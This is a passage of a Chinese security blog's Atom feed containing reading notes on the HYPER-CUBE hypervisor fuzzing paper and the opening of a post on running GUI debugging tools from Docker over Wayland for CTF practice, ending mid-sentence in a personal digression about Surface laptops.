<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>arttnba3&#39;s blog</title>
  
  <subtitle>arttnba3的秘密小屋</subtitle>
  <link href="https://arttnba3.github.io/atom.xml" rel="self"/>
  
  <link href="https://arttnba3.github.io/"/>
  <updated>2023-10-27T11:37:34.977Z</updated>
  <id>https://arttnba3.github.io/</id>
  
  <author>
    <name>arttnba3</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>【PAPER.0x04】论文笔记：HYPER-CUBE: High-Dimensional Hypervisor Fuzzing</title>
    <link href="https://arttnba3.github.io/2023/10/27/PAPER-0X04-HYPER_CUBE/"/>
    <id>https://arttnba3.github.io/2023/10/27/PAPER-0X04-HYPER_CUBE/</id>
    <published>2023-10-27T11:30:54.000Z</published>
    <updated>2023-10-27T11:37:34.977Z</updated>
    
    <content type="html"><![CDATA[<p>hyper 的 不是 visor，是我 cube 哒！</p><span id="more"></span><h1 id="0x00-一切开始之前"><a href="#0x00-一切开始之前" class="headerlink" title="0x00. 一切开始之前"></a>0x00. 一切开始之前</h1><p>笔者最近刚好在弄虚拟化相关的工作（<del>本来以为从字节离职后就不会碰到和虚拟化相关的开发了</del>），而刚好笔者看到有一系列论文（还得是论文作者👍）给出了利用系统虚拟化技术来辅助漏洞挖掘以及针对虚拟化系统进行漏洞挖掘的好东西，因此笔者还是打算抽空浅读一下：）</p><h2 id="Abstract"><a href="#Abstract" class="headerlink" title="Abstract"></a>Abstract</h2><p>虚拟机管理器（Virtual Machine Manager，VMM，aka Hypervisor）是云技术（尤其是 IaaS）的基石，因此其安全问题十分重要</p><p>本文给出 <code>Hyper-Cube</code> ——一个通用的对 hypervisor 进行 fuzzing 的工具</p><h1 id="0x01-Introduction"><a href="#0x01-Introduction" class="headerlink" title="0x01. Introduction"></a>0x01. Introduction</h1><blockquote><p><del>没必要讲但还是简单扯几句</del></p></blockquote><p>系统虚拟化技术是云计算的基石，但 VMM 若有漏洞则会影响到其他 VM 以及服务提供商的安全，因此我们需要一种高效的手段找出 VMM 中的漏洞</p><p>模糊测试（Fuzzing）是一个高效的找漏洞手段，但现在我们很难高效地 fuzz VMM：</p><ul><li>不同于传统 fuzz（只有 stdin 和 syscall 作为输入），fuzz VMM 需要与多种类型的接口 （MMIO、PIO、hypercall、…）进行交互</li><li>VMM crash 后的重启开销较大</li><li>很难高效地 fuzz（例如不能多线程）</li></ul><p>论文写作时（笔者注：2020年）最先进的 hypervisor fuzzer 是由 AFL 改来的 <a href="https://hhannuaa.github.io/papers/VDF_raid17.pdf">VDF</a>，只能 fuzz MMIO&#x2F;PIO；另一个 hypervisor fuzzer <a href="https://www.semanticscholar.org/paper/An-Empirical-Study-into-the-Security-Exposure-to-of-Ormandy/b67dc496b84010aa4f2a0f909fb3cb4d36ba78a0">IOFUZZ</a> 则只能往随机端口写随机值，<del>都弱爆了</del></p><p>为了解决这些挑战，本文给出三个可以提升的目标：</p><ul><li>较高的测试用例吞吐量</li><li>能同时与所有可用接口进行交互</li><li>能为一组不同的 hypervisor 生成稳定（stable）与确定（deterministic）的测试用例</li></ul><p>基于此，作者设计出了 <code>HYPER-CUBE</code>：一个基于一个最小客制化操作系统的通用 hypervisor fuzzer，总结下来贡献有如下三点：</p><ul><li>作者设计了一个多维度的（multi-dimentional）、无平台依赖的（platform-independent）能够有效且高效测试不同接口的模糊测试方法</li><li>作者描述了一个能够高效 fuzz hypervisor 的独立于待测平台的方法</li><li>作者通过一个名为 <code>HYPER-CUBE</code> 的客制操作系统实现了这种方法，并能在真实世界的 hypervisor 中找出漏洞</li></ul><p>项目代码开源于 <a href="">https://github.com/RUB-SysSec/hypercube</a></p><h1 id="0x02-Technology-Background"><a href="#0x02-Technology-Background" class="headerlink" title="0x02. Technology Background"></a>0x02. Technology Background</h1><blockquote><p><del>感觉不如直接看<a href="https://arttnba3.cn/2022/08/29/VURTUALIZATION-0X02-BASIC_KNOWLEDGE/">系统虚拟化导论</a></del></p></blockquote><p>在开始之前先介绍 X86 虚拟化的一些基础知识、X86 中 OS 的启动过程、Guest OS 与 hypervisor 的通信接口</p><h2 id="A-x86-Boot-Process"><a href="#A-x86-Boot-Process" class="headerlink" title="A. x86 Boot Process"></a>A. x86 Boot Process</h2><p>在 x86 机器上最先运行的程序通常是 <code>Basic Input/Output System</code> （BIOS） 或 <code>Unified Extensible Firmware Interface</code> （UEFI），本文将这样的程序称为 <code>固件</code> （firmware），之后便是运行 boot loader （如 GRUB）来准备环境并引导操作系统内核，再由内核来配置其他硬件（如中断控制器、PCI 设备）</p><h2 id="B-Input-x2F-Output-on-x86"><a href="#B-Input-x2F-Output-on-x86" class="headerlink" title="B. Input&#x2F;Output on x86"></a>B. Input&#x2F;Output on x86</h2><p>x86 上与设备通信的方式有：</p><ul><li><code>Port I/O</code>：传统的端口地址总线，通过 <code>in</code>、<code>out</code> 指令访问</li><li><code>Memory-Mapped I/O</code>：外设寄存器&#x2F;内存被映射到物理地址总线上，从而可以通过传统内存访问方式进行访问</li><li><code>Direct Memory Access</code>：这种机制允许外设直接访问物理内存，本文主要关注 PCI&#x2F;PCIe DMA，而非 ISA DMA（因为难搞）</li></ul><p>表 1 给出接口总览：</p><p><img src="https://s2.loli.net/2023/10/21/1h6xUYOkTNiBVgl.png" alt="TABLE I: Overview of hypervisor attack surfaces."></p><h2 id="C-Hypervisor"><a href="#C-Hypervisor" class="headerlink" title="C. Hypervisor"></a>C. Hypervisor</h2><p>Hypervisor 为 VM 提供可控的虚拟环境（虚拟 CPU、虚拟内存、模拟中断），当 VM 需要进行特权操作时便会触发 <code>VM-Exit</code> 将控制权返还给 hypervisor，由其完成模拟操作后返还控制权——称为 <code>Trap and Emulate</code> 机制</p><p>通过提供完全虚拟化的环境，hypervisor 可以在物理机上同时运行多个 VM</p><h3 id="1-CPU-and-Memory-Virtualization"><a href="#1-CPU-and-Memory-Virtualization" class="headerlink" title="1) CPU and Memory Virtualization"></a>1) CPU and Memory Virtualization</h3><p>过去人们用 <em>二进制转译</em> （binary translation）技术实现完全的 CPU 与内存虚拟化，通过 <code>trap and emulate</code> 模型捕获形如 <code>mov cr3</code> 这样的特权指令，但性能开销巨大，于是 Intel 和 AMD 都各自引入了自己的硬件辅助虚拟化支持</p><h3 id="2-Device-Emulation"><a href="#2-Device-Emulation" class="headerlink" title="2) Device Emulation"></a>2) Device Emulation</h3><p>hypervisor 还需要模拟包括中断控制器在内的标准硬件，其主要有两种交互机制：MMIO 与 port I&#x2F;O，不过 hypervisor 不需要中断 DMA 内存访问</p><p>图 1 给出一个通过 <em>trap and emulate</em> 模型实现设备虚拟化的例子（QEMU&#x2F;KVM）：</p><p><img src="https://s2.loli.net/2023/10/25/OwSxUy159cgsQo7.png" alt="Fig. 1: Device emulation and its trap and emulate handling of privilegedinstructions in KVM and QEMU."></p><h3 id="3-Para-Virtualization"><a href="#3-Para-Virtualization" class="headerlink" title="3) Para-Virtualization"></a>3) Para-Virtualization</h3><p>虚拟机并不需要直接接触到实际的硬件，<em>半虚拟化</em> （para-virtualization）由此诞生，这种技术本质上需要我们去修改 OS，例如 VirtIO 便提供了一个统一的虚拟设备协议，OS 只需要实现一套虚拟设备驱动即可</p><p>现代的硬件加速的（hardware-accelerated）虚拟化则引入了新的指令叫 <code>hypercall</code>，用来主动触发 <code>VM-exit</code> 以实现一些任务（以 Intel 为例为 <code>vmcall</code> 指令）</p><h2 id="D-Fuzzing-Hypervisor"><a href="#D-Fuzzing-Hypervisor" class="headerlink" title="D. Fuzzing Hypervisor"></a>D. Fuzzing Hypervisor</h2><p>对 hypervisor 的 fuzzing 存在接口繁多、重启开销大的挑战，目前绝大部分研究来自工业界，例如 <a href="https://www.blackhat.com/docs/eu-16/materials/eu-16-Li-When-Virtualization-Encounters-AFL-APortable-Virtual-Device-Fuzzing-Framework-WithAFL-wp.pdf.">Tang</a> 实现了一个定制于 QEMU 的 SeaBIOS 的 AFL 扩展，学术界则仅有一个 VDF</p><h1 id="0x03-Design"><a href="#0x03-Design" class="headerlink" title="0x03. Design"></a>0x03. Design</h1><h2 id="A-Threat-Model"><a href="#A-Threat-Model" class="headerlink" title="A. Threat Model"></a>A. Threat Model</h2><p>攻击者有着对虚拟机的完全控制权，其目的为获取宿主机上其他虚拟机或是宿主机本身的控制权，DoS 攻击也纳入考虑 </p><h2 id="B-Challenge-in-Fuzzing-Hypervisors"><a href="#B-Challenge-in-Fuzzing-Hypervisors" class="headerlink" title="B. Challenge in Fuzzing Hypervisors"></a>B. Challenge in Fuzzing Hypervisors</h2><p>如图 2 所示，hypervisor 与 guest 间的交互接口众多，且非所有接口都有文档，需要 fuzzer 能实现与 hypervisor 间的有意义交互；VM 中系统启动过程也可能影响漏洞寻找过程，但重启系统耗时较长；硬件加速也可能带来不确定性</p><p><img src="https://s2.loli.net/2023/10/27/kqSU9gYXdzChcFe.png" alt="Fig. 2: High-level overview of the system architecture of HYPER-CUBE"></p><h2 id="C-Architecture"><a href="#C-Architecture" class="headerlink" title="C. Architecture"></a>C. Architecture</h2><h3 id="1-High-Level-Overview"><a href="#1-High-Level-Overview" class="headerlink" title="1) High-Level Overview"></a>1) High-Level Overview</h3><p>文章中的 fuzzer 包含如图 2 所示的三个主要组成部分：</p><ul><li><code>HYPER-CUBE OS</code> 在虚拟机内启动并枚举硬件接口，定制的系统使得我们对 VM 有着完全的控制权限</li><li>随后启动的用来 fuzz hypervisor 的字节码解释器 <code>TESSERACT</code></li><li>一组额外的工具，用于向 <code>TESSERACT</code> 提供字节码流、反编译执行的字节码程序、使用如串口等接口观测 hypervisor</li></ul><p>这样的架构允许我们实现上文所述的三个目标：</p><ul><li><code>High Performance Fuzzing</code>：客制操作系统 <code>HYPER-CUBE OS</code> 比 COTS（Commercial Off-The-Shelf） OS 更轻量级，从而在 crash 后能快速重启系统；编译执行程序进行 fuzz 也较耗时，因此作者使用自制的运行在 VM 中 ring0 的 <code>TESSERACT</code> 字节码解释器，以 <em>fuzzer-friendly</em> 的方式设计字节码：最大化产生有用指令的可能性、对内存地址不作为指针而是作为大小与偏移值进行编码（<code>TESSERACT</code> 会记录那些有趣的内存区域）；为了提高生成合理字节码的概率，所有参数都被映射到模范围中</li><li><code>Generic High-Dimensional Fuzzing</code>：现有的 hypervisor fuzzer 通常关注于某一接口，而 <code>TESSERACT</code> 则可以与所有可用接口交互</li><li><code>Stable and Deterministic Fuzzing</code>：此前的 hypervisor fuzzer 基于 COTS OS 从而引入了大量属于系统本身的不确定性，作者开发的操作系统 <code>HYPER-CUBE OS</code> 则以对环境的控制权避免了这个问题，且能进行一些有趣的操作</li></ul><h3 id="2-HYPER-CUBE-OS"><a href="#2-HYPER-CUBE-OS" class="headerlink" title="2) HYPER-CUBE OS"></a>2) HYPER-CUBE OS</h3><p>客制操作系统 <code>HYPER-CUBE OS</code> 为该 fuzzer 的核心，其实现了 <a href="https://www.gnu.org/software/grub/manual/multiboot2/multiboot.html">multiboot 2 规范</a>，并为我们的 fuzzer （<code>TESSERACT</code>）提供了一个通用平台，其有着两个主要任务：物理内存管理与设备枚举，前者需要管理所有的物理内存，后者则需要枚举 MMIO 与 port I&#x2F;O 的地址范围，并与 PIC&#x2F;APIC 交互，有的信息（如 MMIO 区域）通过 BIOS&#x2F;UEFI 传递，而有的信息（如 I&#x2F;O 端口与 PCI 设备）则又需要手动枚举</p><h3 id="3-TESSERACT"><a href="#3-TESSERACT" class="headerlink" title="3) TESSERACT"></a>3) TESSERACT</h3><p><code>HYPER-CUBE OS</code> 启动后会与 hypervisor 进行随机交互，这通过自定义字节码解释器 <code>TESSERACT</code> 定义，字节码可以来自于 VM 外，也可以来自于该解释器内置的伪随机数生成器，字节码的设计形式使得任意字节串都是一个合法程序</p><p>解释器解码时会将所有的值模到一个范围中，根据 opcode 调用不同的处理函数（进行单个&#x2F;多个动作）；解释器还维护一组单个为 4k 页的会被被定期覆盖为随机数据的 scratch 区域，这使得 <code>TESSERACT</code> 可以在其上创建自定义数据结构作为输入</p><h3 id="4-External-Tools"><a href="#4-External-Tools" class="headerlink" title="4) External Tools"></a>4) External Tools</h3><p>该 fuzzer 的最后一部分为运行在 host 侧的三个独立的辅助工具（通常在 fuzzing 之后使用）：</p><ul><li>logger 在 fuzzing 时岚姐 VM 的串口通信并存储以供后续分析</li><li>minimization tool 在找到 bug 后使用同样的种子重新生成程序并在随机移除部分段后观测结果，算法收敛后通常能获得包含数十条指令的程序，出于调试目的我们还可以将 <code>TESSERACT</code> 作为独立的 ring 3 程序运行</li><li>decompiler 将给定的（最小化）字节码转换为等价的 C 程序以分析找到漏洞的字节流程序，这样的 C 程序可以被编译为 HYPER-CUBE OS 的一个模块或是插入到 COTS OS 内核驱动中进行调试</li></ul><h1 id="0x04-Implementation-Details"><a href="#0x04-Implementation-Details" class="headerlink" title="0x04. Implementation Details"></a>0x04. Implementation Details</h1><blockquote><p>这一节很多基础知识，懒得摘抄太多了</p></blockquote><h2 id="A-HYPER-CUBE-OS"><a href="#A-HYPER-CUBE-OS" class="headerlink" title="A. HYPER-CUBE OS"></a>A. HYPER-CUBE OS</h2><h3 id="1-Boot-Process"><a href="#1-Boot-Process" class="headerlink" title="1) Boot Process"></a>1) Boot Process</h3><p>在启动阶段固件会从不同的外设（称为 Option ROMs）中载入程序以检测硬件并生成数据信息，随后加载 bootloader 以装载内核，multiboot 标准被制定来标准化 bootloader （并扩展至第二代以支持 UEFI）以在不同 BIOS&#x2F;UEFI 间通用，遵循 multiboot2 的内核可以被构建为 ELF 文件，<code>HYPER-CUBE OS</code> 便基于 multiboot2 规范并使用 GRUB 进行引导，从而使得其可以通过传统 BIOS 或 UEFI 固件进行启动，且在入口点便进入保护模式</p><ul><li><code>Initializing Interrupts</code>：<code>HYPER-CUBE OS</code> 会配置 PIC&#x2F;APIC 以初始化所有基本的中断&#x2F;异常的 handlers，并通过 masking OS 内的所有终端寄存器以屏蔽了所有外部中断，从而确保 fuzzing 过程不会被中断</li></ul><h3 id="2-Memory-Management"><a href="#2-Memory-Management" class="headerlink" title="2) Memory Management"></a>2) Memory Management</h3><p>作者实现了一个单次分配一整张页面的简易堆管理器，减少了内存碎片并提高了<del>撸棒</del>健壮性，实际上仅在枚举设备时 <code>HYPER-CUBE OS</code> 会为 <code>TESSERACT</code> 分配少量内存，因此额外开销可以忽略不计</p><p>现代操作系统通常使用分页机制支撑虚拟空间，但一些任务（如页表和 MMIO）需要直接访问物理内存，因此 <code>HYPER-CUBE OS</code> 维护一个一对一直接映射到物理内存的区域（<code>0x0 ~ 0x100000</code>），此外由 BIOS&#x2F;UEFI 传来的可用物理内存信息会被用作内核堆，最后 <code>HYPER-CUBE OS</code> 会创建另一个对 MMIO 区域的重映射，内存布局如图 3 所示：</p><p><img src="https://s2.loli.net/2023/10/27/EiusOdrowH4zgSp.png" alt="Fig. 3: Virtual memory layout of HYPER-CUBE"></p><h3 id="3-Device-Enumeration"><a href="#3-Device-Enumeration" class="headerlink" title="3) Device Enumeration"></a>3) Device Enumeration</h3><p>PCI 这样的硬件设备或是 APIC 或 高精确事件计时器（High Precision Event Timer，HPET）可以将内部寄存器映射到物理内存上，访问对应的 MMIO 区域则可以直接影响这些设备的状态，<code>HYPER-CUBE OS</code> 会枚举可用来 fuzzing 的不同接口，这需要枚举所有外设所用的 MMIO 及 port I&#x2F;O 地址</p><ul><li><code>Core Components</code>：由 APIC 或 HPET 提供的 MMIO 区域信息通过名为 <code>高级配置与电源接口</code> （Advanced Configuration and Power Interface，ACPI）表的形式进行描述，HPET 与 APIC MMIO 区域的基址存放在对应的 ACPI 表中（由 multiboot bootloader 提供），ACPI 表中所有的基址指针都在 <code>TESSERACT</code> 中注册为 fuzzing 目标地址</li><li><code>PCI-/PCIe-Enumeration</code>：<code>HYPER-CUBE OS</code> 依赖于传统 PCI 配置 I&#x2F;O 接口或基于位于增强配置机制（<code>Enhanced Configuration Mechanism</code>，ECAM）基指针的 MMIO 区域的现代 PCI 配置空间进行 PCI 设备枚举，ECAM 信息同样存放在 ACPI 表中</li><li><code>ISA-Enumeration / I/O Port Probing</code>：ISA 设备没有系统的枚举与检测的办法，因此 <code>HYPER-CUBE OS</code> 会对所有的 2<sup>16</sup> 个端口进行读写，发生改变的端口值则被认为是一个模拟设备</li></ul><h2 id="B-TESSERACT"><a href="#B-TESSERACT" class="headerlink" title="B. TESSERACT"></a>B. TESSERACT</h2><p><code>TESSERACT</code> 是一个复杂指令集解释器，总的来说实现了如下指令：</p><p><img src="https://s2.loli.net/2023/10/27/6qHpPGwKkvshNR1.png" alt="image.png"></p><p>字节流输入将被 <code>TESSERACT</code> 解码为不同的指令操作，在没有外部字节码流作为输入的情况下其使用伪随机数生成器来生成随机指令（如图 4 所示），在找到造成崩溃的初始 PRNG 状态后，作者使用相同的状态重新生成相同的字节串（可能长达数百万到数千万条指令），并将其嵌入到 <code>HYPER-CUBE OS</code> 镜像中进行引导，若依然崩溃则会随机删除 50% 指令片段并重复此过程以获取最小字节串，随后通过反汇编器转为人类可读的 C 程序形式</p><p><img src="https://s2.loli.net/2023/10/27/JYXaqnIbLVBEy12.png" alt="Fig. 4: TESSERACT consuming a byte string provided either by a PRNG or an embedded payload. Upon receiving the byte string, TESSERACT decodes it into opcodes such as 1 and 2 . It then calls the handler that actually performs I/O operations."></p><h1 id="0x05-Evaluation"><a href="#0x05-Evaluation" class="headerlink" title="0x05. Evaluation"></a>0x05. Evaluation</h1><p>作者希望能够回答以下四个研究问题：</p><ul><li>使用 <code>HYPER-CUBE</code> 是否能够在不同 hypervisor 中发现新的漏洞？</li><li>是否能重新发现那些已知的漏洞（如 QEMU 的 CVE-2015-3456）？</li><li>与其他的 hypervisor fuzzer 相比在覆盖率方面如何？</li><li>与其他的 hypervisor fuzzer 相比在性能方面如何？</li></ul><blockquote><p>贴几个表看看实力，具体的原文就不摘抄了，反正很强就对了，建议看原论文</p></blockquote><p><img src="https://s2.loli.net/2023/10/27/Rti6dTquacA9WJU.png" alt="TABLE II: Reported bugs found by HYPER-CUBE."></p><p><img src="https://s2.loli.net/2023/10/27/rFPLTHKihf8VZ2k.png" alt="TABLE III: Previously known vulnerabilities in QEMU / KVM found by HYPER-CUBE (average time in seconds over 20 runs each ± standard deviation)."></p><p><img src="https://s2.loli.net/2023/10/27/NsWtpZwlAk2xJ6L.png" alt="TABLE IV: Branch coverage and bugs found by HYPER-CUBE and VDF"></p><p><img src="https://s2.loli.net/2023/10/27/Mz5sy1NQApVh6OF.png" alt="TABLE V: Throughput of TESSERACT vs. GCC (with -O0)"></p><p><img src="https://s2.loli.net/2023/10/27/oUwZFAtBHdISCPy.png" alt="TABLE VI: Boot time comparison using QEMU 4.0.1-rc4 ASAN (average over 20 runs each ± standard deviation)."></p><p><img src="https://s2.loli.net/2023/10/27/evFjpUbtR9TmZLE.png" alt="TABLE VII: Automatic emulator detection rate of HYPER-CUBE. #scanning indicates the number of interfaces identified by our scanning. #well-known denotes the number of ports that the scanning did not find, but were contained in our list of well-known ports. #baseline is the number of interfaces, as reported by the hypervisor."></p><h1 id="0x06-Related-Work"><a href="#0x06-Related-Work" class="headerlink" title="0x06. Related Work"></a>0x06. Related Work</h1><p>过去的项目使用客制操作系统来测试 hypervisor，例如 <a href="https://github.com/airbus-seclab/crashos">CrashOS</a> 是包含了一组手写测试用例的 OS，但不提供发现新漏洞的方法；Intel CHIPSEC 套件则提供了不同的 fuzz 模拟设备的组件；Ormandy 则写了一个用于在不同 hypervisor 中创建随机 I&#x2F;O 访问的 <a href="https://www.semanticscholar.org/paper/An-Empirical-Study-into-the-Security-Exposure-to-of-Ormandy/b67dc496b84010aa4f2a0f909fb3cb4d36ba78a0">fuzzer</a>；Henderson 等人则提出了通过修改开源 hypervisor 并提供 AFL 支持来 fuzz 特定模拟设备的<a href="https://hhannuaa.github.io/papers/VDF_raid17.pdf">方法</a>；Tang 等人则通过[在 QEMU 的 SeaBIOS 上实现接口](<a href="https://www.blackhat.com/docs/eu-16/materials/">https://www.blackhat.com/docs/eu-16/materials/</a><br>eu-16-Li-When-Virtualization-Encounters-AFL-APortable-Virtual-Device-Fuzzing-Framework-WithAFL-wp.pdf)以提供 AFL 与 QEMU 间的互相操作性；来自 MWR Labs 和微软安全研究与防御部门的 Amardeep Chana 则引入了用于模糊测试 Hyper-V hypercall（VMBus）的<a href="https://labs.mwrinfosecurity.com/blog/venturesinto-hyper-v-part-1-fuzzing-hypercalls/">模糊测试工具</a>（附加<a href="https://blogs.technet.microsoft.com/srd/2019/01/28/fuzzing-para-virtualizeddevices-in-hyper-v/">链接</a>）</p><h1 id="0x07-Discussion"><a href="#0x07-Discussion" class="headerlink" title="0x07. Discussion"></a>0x07. Discussion</h1><p>这个工具很强大，但仍有一些可以提升的点</p><h2 id="A-Coverage-Guided-Hypervisor-Fuzzing"><a href="#A-Coverage-Guided-Hypervisor-Fuzzing" class="headerlink" title="A. Coverage-Guided Hypervisor Fuzzing"></a>A. Coverage-Guided Hypervisor Fuzzing</h2><p>与覆盖率信息进行结合可能会提高发现漏洞的概率，为了发现新的覆盖范围或有趣行为，需要逐步构建 hypervisor 中的状态，而可能的操作空间巨大，让状态增长到有趣的事情发生（如 crash）似乎会极大增加吞吐量</p><h2 id="B-Hyper-V"><a href="#B-Hyper-V" class="headerlink" title="B. Hyper-V"></a>B. Hyper-V</h2><p><code>HYPER-CUBE</code> 暂不支持 <code>Hyper-V</code> ，因为其不支持 64 位 UEFI 引导（<code>Hyper-V</code> 要求操作系统以此模式进行引导）；同时 HYPER-CUBE 对半虚拟化的支持有限，目前只实现了不太可能单独触发有趣覆盖的通用操作</p><h1 id="0x08-Conclusion"><a href="#0x08-Conclusion" class="headerlink" title="0x08. Conclusion"></a>0x08. Conclusion</h1><blockquote><p>没啥好说的</p></blockquote>]]></content>
    
    
    <summary type="html">&lt;p&gt;hyper 的 不是 visor，是我 cube 哒！&lt;/p&gt;</summary>
    
    
    
    <category term="PAPER" scheme="https://arttnba3.github.io/categories/PAPER/"/>
    
    
    <category term="信息安全" scheme="https://arttnba3.github.io/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
    
    <category term="FUZZ" scheme="https://arttnba3.github.io/tags/FUZZ/"/>
    
    <category term="论文笔记" scheme="https://arttnba3.github.io/tags/%E8%AE%BA%E6%96%87%E7%AC%94%E8%AE%B0/"/>
    
    <category term="虚拟化" scheme="https://arttnba3.github.io/tags/%E8%99%9A%E6%8B%9F%E5%8C%96/"/>
    
    <category term="Qemu" scheme="https://arttnba3.github.io/tags/Qemu/"/>
    
  </entry>
  
  <entry>
    <title>【OPS.0x01】为 Docker 连接 Wayland 图形环境</title>
    <link href="https://arttnba3.github.io/2023/10/25/OPS-0X01-DOCKER_WAYLAND_GUI/"/>
    <id>https://arttnba3.github.io/2023/10/25/OPS-0X01-DOCKER_WAYLAND_GUI/</id>
    <published>2023-10-24T17:02:45.000Z</published>
    <updated>2023-11-09T17:10:48.520Z</updated>
    
    <content type="html"><![CDATA[<p>这一日，Docker 再入桌面 GUI 境界</p><span id="more"></span><h1 id="0x00-一切开始之前"><a href="#0x00-一切开始之前" class="headerlink" title="0x00. 一切开始之前"></a>0x00. 一切开始之前</h1><blockquote><p>如果你只是寻求 docker 接通 Wayland 跑图形界面的解决方案，请直接跳过这一小节 ：）</p><p>如果你想要的是 docker 接通显卡的解决方案，那你走错路了，这个方案在<a href="https://arttnba3.cn/2023/08/31/OPS-0X00-DOCKER_ON_SERVER/#0x02-%E5%88%9B%E5%BB%BA%E5%8F%AF%E4%BB%A5%E4%BD%BF%E7%94%A8%E6%98%BE%E5%8D%A1%E7%9A%84-docker-%E7%8E%AF%E5%A2%83">隔壁</a></p></blockquote><p>笔者大一刚开始学 Pwn 的时候就因环境问题而感到苦手，上一题的环境可能是 <code>Ubuntu 16.04</code> 带个 <code>glibc-2.23</code> 只有 <code>fastbin</code>，下一题可能又变成 <code>Ubuntu 18.04</code> 带个 <code>glibc-2.27</code> 又多一个 <code>tcache</code> ，然后笔者本地环境又是 <code>Ubuntu 20.04</code> 带个 <code>glibc-2.31</code> 的同时 <code>tcache</code> 又多带一个 key，对于那时候以 glibc heap 利用作为主流的 Pwn 题而言若是本地 libc 版本不同则根本没有办法很好地调试好打远程</p><p>通过 <code>LD_PRELOAD</code> 参数在程序执行前 <em>预先加载 libc</em> 或许某些程度上是一个可行的办法，至少 libc 大版本相同的情况下载入不同的小版本基本上是没问题的，但是由于不同系统环境中 ld 版本不同的缘故，对于跨 ld 版本加载不同版本的 libc 则又可能直接 segmentation fault 了</p><p>虽然 Linux 的用户环境并不似 Windows 那样有着强壮的前向兼容性，但是用户环境依托于内核环境、依托于内核向用户态暴露的接口——系统调用，而这并不是会轻易发生变动以及兼容性破坏的一个东西，由此，通过<strong>重新开辟一个对应的新的用户环境的方式</strong>—— 即形如 <code>Docker</code> 这样的<strong>操作系统层上的虚拟化方案</strong>，我们便能非常简单地搭建不同的 Pwn 题所对应的原始环境</p><blockquote><p><del>当然，这里就不得不提<a href="https://arttnba3.cn/2021/05/20/PIECES-0X00-SHELL_OUTSIDE-0-LOST_UMBRELLA/#arttnba3-arttnba3-cn-x2F-cat-flag">某些连 libc 都不给的是人是鬼全靠猜的比赛</a>的含金量了</del></p></blockquote><p>但是 Docker 一直有一个问题就是<strong>默认是没有图形环境的</strong>，这意味着我们没法直接在 Docker 当中运行 GUI 程序，对于需要复杂堆风水等多次调试的 Pwn 题目而言则没办法像直接运行在主机上那样直接通过 <code>gdb.attach()</code> 弹一个伪终端窗口出来：</p><p><img src="https://s2.loli.net/2023/10/24/ogN4EqIUx9TVm6u.jpg" alt="感觉不如 lldb"></p><p><a href="https://github.com/tmux/tmux/wiki">TMUX</a> 为我们提供了一个比较好的 docker 中的多终端解决方案，当你在 tmux 中运行 exploit 执行到 <code>gdb.attach()</code> 这样需要一个新终端的命令时，tmux 可以无缝分割出一个新的窗口，通过额外指定 pwntools 中的 <code>context.terminal</code> 环境变量可以控制新窗口的分割位置：</p><p><img src="https://s2.loli.net/2023/10/24/i2XEPgZGlVse1W8.jpg" alt="是新终端吗？如新"></p><p>但是 tmux 的翻页手感终究是差点意思，不像图形化界面那样可以很方便地用滚轮滚来滚去，同时基于 GUI 窗口的跨行文本复制也会跨多个 tmux 窗口，打破了不同窗口的隔离性：</p><p><img src="https://s2.loli.net/2023/10/24/uaZ1VEfeXFDCshq.jpg" alt="更重要的一点是笔者当时非常 sb 认为 tmux 不能翻页"></p><p>笔者当年的解决方案是直接开多个虚拟机，但用起来总感觉差点意思不说，还占用了大量的物理磁盘空间——笔者本科阶段前两年所用的电脑是<strong>机身只搭载了一块 512GB SSD 的 surface book 2</strong>——为什么这里要特别讲一下这个机型并不是因为笔者想要炫富，虽然说从价格而言 surface 系统产品和 MacBook 系列产品一样同属价格极高性价比极低的“高端产品”，但笔者当时是在某海鲜市场买的可能大于二手的机子，所以其实没有花太多钱，但和 MacBook 一样的是 surface 全系列产品<strong>没有办法自行更换包括内存与硬盘在内的任何部件</strong>，而即便是在海鲜市场寻宝的情况下笔者也买不起更大容量的版本，再加上笔者当时除了是个计算机科学爱好者以及网络空间安全专业本科生的身份以外还是半个画师加十六分之一个平面设计师（当然现在已经不是本科生了），装个 visual studio 加个 matlab 加上 jetbrains 全家桶再装个 adobe 半家桶（主要就用 PS 和 AI 还有个剪视频的叫啥👴已经记不得了）就已经把硬盘填得满满当当的了，各种杂七杂八的资料照片音乐视频啥的又要吃掉少说几十 GB，这个时候再塞几个平均十几 GB 的各种虚拟机（主力虚拟机所占用的硬盘空间超过100GB）无疑更是让本就不富裕的 <strong>512GB SSD</strong> 雪上加霜</p><blockquote><p>而笔者为什么选择买这样一台中看不中用的电脑是因为在初中的时候笔者看一本不知道叫啥的电子硬件相关的杂志中看到 <code>surface book</code> 的 <em>屏幕键盘可分离、独显放置在键盘中</em> 的这样一个前所未有的解决方案感到十分惊人加非常的帅气，于是就一直心心念念想要买一台这样的本子，高中时期笔者换过三台不同的平板电脑二合一产品（当然，都是从某海鲜市场淘来的，且基本上是卖了上一台才买下一台），其中第一台是 surface 3 而第三台是 surface pro 3，当时的主要用途是拿来日常刷刷 OI 、写点小说<del>（那么这里就不得不简单帮忙推广一下某不知名作家所写的<a href="https://www.qidian.com/book/1027074530/">《从零开始的 CTFer 生活》</a> 这部小说了虽然一直在咕咕咕） ~~、玩玩 MC ~~顺便在 mcmod wiki 上写小说</del> 和一些轻量游戏，体感其实还行</p><blockquote><p>当然现在微软的 surface 系列产品已经能够初步地自行更换硬盘，虽然是充满槽点的 <code>2230</code> 规格，但是和隔壁某水果品牌相比已经好得不得了了</p><blockquote><p>但是各项性能又被隔壁秒成渣渣了，微软你在干什么啊微软（恼）</p></blockquote></blockquote><p>以及 surface 系统产品一直有一个噱头就是有个触控笔可以画画，也就是自带数位屏，这也是这个产品一直以来最吸引笔者的一点，虽然微软最初给大家呈上来的只是一坨闻着香吃着臭的答辩，但笔者一直希望随着产品不断迭代，微软能够把这个功能给真正做好，就算达不到 wacom 上万块钱的数位屏相的高度至少也要和国产的一千出头的数位屏掰个手腕的程度，可惜<strong>哪怕是一直到今天最新的 surface pro 9 这一代产品，其绘画手感依旧比不过几千块钱的 iPad ，甚至比不过200块出头的国产数位板</strong>（当然笔者只买了 surface pro 8 没有买 surface pro 9 因为微软非常 SB 地把 3.5mm 耳机接口这个天顶星科技给砍掉了并且性能和续航和 8 代相比并没有什么提升简而言之又是挤牙膏的一代，但笔者有去微软线下门店亲自尝试过最新一代，绘画手感依旧一坨答辩）</p></blockquote><p>虽然 surface book 2 